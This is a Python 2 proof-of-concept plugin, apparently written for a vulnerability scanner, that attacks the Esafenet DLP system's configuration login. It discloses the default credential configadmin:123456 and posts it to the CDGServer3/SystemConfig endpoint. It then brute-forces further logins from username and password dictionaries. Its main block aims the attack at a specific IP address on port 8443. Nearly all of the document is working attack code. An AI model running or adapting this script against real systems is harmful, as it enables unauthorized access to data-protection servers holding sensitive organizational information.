#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  亿赛通数据泄露防护(DLP)系统 weak pass
Author    :  a
mail      :  a@lcx.cc



亿赛通数据泄露防护(DLP)系统 系统配置模块的默认登录凭证'configadmin:123456'
"""


import urlparse
import time
import base64 

def assign(service, arg):
    if service == 'esafenet_dlp':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    defaultpass = ['configadmin','123456']
    sdkpass = loadSDKWeakPassWd(arg)
    res ,code = weakPass(arg,defaultpass)
    if code ==0:
        return
    if 'jdbc:jtds:sqlserver' in res and code == 200:
        security_hole(arg +'     user:%s pass:%s' % (defaultpass[0],defaultpass[1]))
    else:
        security_note('using SDK to creak ....')
        for l in sdkpass:
            res ,code = weakPass(arg,l)
            if 'dubbo.js' in res and code == 200:
                security_hole(arg +'     user:%s pass:%s' % (l[0],l[1])) 
                                
    
def weakPass(arg,list):
    data = 'command=Login&verifyCodeDigit=dfd&name=%s&pass=%s' %(list[0],list[1])
    payload = 'CDGServer3/SystemConfig'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url,data) 
    return res ,code
    
def loadSDKWeakPassWd(args):
    r = urlparse.urlparse(args)
    host = r.hostname
    sdklist = []
 
    pass_list = util.load_password_dict(
        host,
        userfile='database/http_user.txt', 
        passfile='database/http_pass.txt',
        userlist=None,
        passlist=None,
        mix=True,
        )
    sdklist = pass_list
    return sdklist
       

if __name__ == '__main__':
    from dummy import *
    audit(assign('esafenet_dlp','https://222.223.236.148:8443/')[1])